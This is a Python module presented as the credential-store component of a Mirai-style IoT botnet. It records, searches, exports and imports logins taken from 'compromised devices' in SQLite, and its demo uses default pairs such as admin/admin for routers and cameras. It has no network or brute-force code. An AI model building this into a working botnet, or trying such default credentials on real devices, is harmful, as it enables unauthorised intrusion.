#!/usr/bin/env python3
"""
Credential Harvester - Mirai-inspired Implementation
Educational/Research Purpose Only

This module harvests and manages credentials from compromised devices.
"""

import os
import time
import json
import base64
import hashlib
import sqlite3
import threading
from typing import List, Dict, Tuple, Optional

class CredentialHarvester:
    def __init__(self, db_path: Optional[str] = None):
        """
        Initialize credential harvester
        
        Args:
            db_path: Path to SQLite database (optional)
        """
        self.credentials = []
        self.credentials_lock = threading.Lock()
        
        # Database setup
        self.db_path = db_path or ':memory:'
        self.db_conn = None
        self._setup_database()
    
    def _setup_database(self):
        """Setup SQLite database for credential storage"""
        try:
            self.db_conn = sqlite3.connect(self.db_path)
            cursor = self.db_conn.cursor()
            
            # Create credentials table
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host TEXT,
                port INTEGER,
                username TEXT,
                password TEXT,
                device_type TEXT,
                timestamp INTEGER,
                success INTEGER,
                source TEXT
            )
            ''')
            
            # Create index
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_host ON credentials (host)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_creds ON credentials (username, password)')
            
            self.db_conn.commit()
        except Exception as e:
            print(f"[!] Database setup error: {e}")
    
    def add_credential(self, host: str, username: str, password: str, 
                       port: int = 23, device_type: str = 'unknown', 
                       success: bool = True, source: str = 'bruteforce') -> bool:
        """
        Add a new credential to the database
        
        Args:
            host: Target host
            username: Username
            password: Password
            port: Port number
            device_type: Type of device
            success: Whether login was successful
            source: Source of credential
            
        Returns:
            Success status
        """
        try:
            # Add to in-memory list
            with self.credentials_lock:
                self.credentials.append({
                    'host': host,
                    'port': port,
                    'username': username,
                    'password': password,
                    'device_type': device_type,
                    'timestamp': int(time.time()),
                    'success': success,
                    'source': source
                })
            
            # Add to database
            if self.db_conn:
                cursor = self.db_conn.cursor()
                cursor.execute(
                    '''
                    INSERT INTO credentials 
                    (host, port, username, password, device_type, timestamp, success, source)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    ''',
                    (host, port, username, password, device_type, 
                     int(time.time()), 1 if success else 0, source)
                )
                self.db_conn.commit()
                
            return True
        except Exception as e:
            print(f"[!] Error adding credential: {e}")
            return False
    
    def get_credentials(self, limit: int = 100) -> List[Dict]:
        """
        Get list of credentials
        
        Args:
            limit: Maximum number of credentials to return
            
        Returns:
            List of credential dictionaries
        """
        with self.credentials_lock:
            return self.credentials[-limit:] if limit > 0 else self.credentials.copy()
    
    def get_credentials_for_host(self, host: str) -> List[Dict]:
        """
        Get credentials for a specific host
        
        Args:
            host: Host IP
            
        Returns:
            List of credential dictionaries
        """
        with self.credentials_lock:
            return [c for c in self.credentials if c['host'] == host]
    
    def get_credentials_by_device_type(self, device_type: str) -> List[Dict]:
        """
        Get credentials for a specific device type
        
        Args:
            device_type: Type of device
            
        Returns:
            List of credential dictionaries
        """
        with self.credentials_lock:
            return [c for c in self.credentials if c['device_type'] == device_type]
    
    def search_database(self, query: str = None, 
                        device_type: str = None, 
                        success_only: bool = True) -> List[Dict]:
        """
        Search database for credentials
        
        Args:
            query: Search query
            device_type: Type of device
            success_only: Only return successful logins
            
        Returns:
            List of credential dictionaries
        """
        if not self.db_conn:
            return []
            
        try:
            cursor = self.db_conn.cursor()
            
            sql = "SELECT host, port, username, password, device_type, timestamp, success, source FROM credentials WHERE 1=1"
            params = []
            
            if query:
                sql += " AND (host LIKE ? OR username LIKE ? OR password LIKE ?)"
                query_param = f"%{query}%"
                params.extend([query_param, query_param, query_param])
            
            if device_type:
                sql += " AND device_type = ?"
                params.append(device_type)
            
            if success_only:
                sql += " AND success = 1"
            
            sql += " ORDER BY timestamp DESC LIMIT 1000"
            
            cursor.execute(sql, params)
            
            results = []
            for row in cursor.fetchall():
                results.append({
                    'host': row[0],
                    'port': row[1],
                    'username': row[2],
                    'password': row[3],
                    'device_type': row[4],
                    'timestamp': row[5],
                    'success': bool(row[6]),
                    'source': row[7]
                })
            
            return results
        except Exception as e:
            print(f"[!] Database search error: {e}")
            return []
    
    def export_credentials(self, filename: str) -> bool:
        """
        Export credentials to file
        
        Args:
            filename: Output filename
            
        Returns:
            Success status
        """
        try:
            with self.credentials_lock:
                with open(filename, 'w') as f:
                    json.dump(self.credentials, f, indent=2)
            return True
        except Exception as e:
            print(f"[!] Export error: {e}")
            return False
    
    def import_credentials(self, filename: str) -> int:
        """
        Import credentials from file
        
        Args:
            filename: Input filename
            
        Returns:
            Number of imported credentials
        """
        try:
            with open(filename, 'r') as f:
                creds = json.load(f)
            
            count = 0
            for cred in creds:
                if self.add_credential(
                    cred.get('host', ''),
                    cred.get('username', ''),
                    cred.get('password', ''),
                    cred.get('port', 23),
                    cred.get('device_type', 'unknown'),
                    cred.get('success', True),
                    cred.get('source', 'import')
                ):
                    count += 1
            
            return count
        except Exception as e:
            print(f"[!] Import error: {e}")
            return 0
    
    def get_stats(self) -> Dict:
        """
        Get credential statistics
        
        Returns:
            Dictionary with statistics
        """
        with self.credentials_lock:
            total = len(self.credentials)
            successful = len([c for c in self.credentials if c['success']])
            failed = total - successful
            
            device_types = {}
            for cred in self.credentials:
                dt = cred.get('device_type', 'unknown')
                device_types[dt] = device_types.get(dt, 0) + 1
            
            sources = {}
            for cred in self.credentials:
                src = cred.get('source', 'unknown')
                sources[src] = sources.get(src, 0) + 1
            
            return {
                'total': total,
                'successful': successful,
                'failed': failed,
                'device_types': device_types,
                'sources': sources
            }
    
    def close(self):
        """Close database connection"""
        if self.db_conn:
            self.db_conn.close()
    
    def __del__(self):
        """Destructor"""
        self.close()


if __name__ == "__main__":
    # Demo mode when run directly
    print("[*] Credential Harvester Module (Mirai-inspired)")
    print("[*] WARNING: For educational/research purposes only")
    
    harvester = CredentialHarvester()
    
    # Add some sample credentials
    harvester.add_credential('192.168.1.1', 'admin', 'admin', 23, 'router')
    harvester.add_credential('192.168.1.10', 'root', '12345', 23, 'camera')
    harvester.add_credential('192.168.1.20', '', 'default', 23, 'dvr')
    
    # Show stats
    stats = harvester.get_stats()
    print(f"\n[*] Credential Stats: {stats['total']} total, {stats['successful']} successful")
    
    # Show device types
    print("\n[*] Device Types:")
    for dt, count in stats['device_types'].items():
        print(f"  - {dt}: {count}")
    
    # Export credentials
    if harvester.export_credentials('demo_credentials.json'):
        print("\n[*] Exported credentials to demo_credentials.json")
